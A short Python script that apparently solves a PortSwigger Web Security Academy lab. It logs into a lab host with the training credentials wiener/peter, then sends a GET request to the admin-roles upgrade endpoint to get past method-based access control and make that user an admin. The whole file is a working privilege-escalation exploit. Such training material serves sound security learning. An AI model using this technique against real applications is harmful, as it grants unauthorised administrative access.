import requests

site = "0a0b00dc032a7d83807e35bf008b00a7.web-security-academy.net/" 
s = requests.Session()

# Step 1: Log in as wiener
login_url = f'https://{site}/login'
login_data = {
    'username': 'wiener',
    'password': 'peter'
}
s.post(login_url, data=login_data)

# Step 2: Attempt GET method-based bypass for upgrade
url = f'https://{site}/admin-roles?action=upgrade&username=wiener'
resp = s.get(url)

print(f"[*] GET request status code: {resp.status_code}")
if "Congratulations" in resp.text:
    print("[✓] Successfully upgraded wiener via GET method.")
else:
    print("[!] Method-based privilege escalation failed.")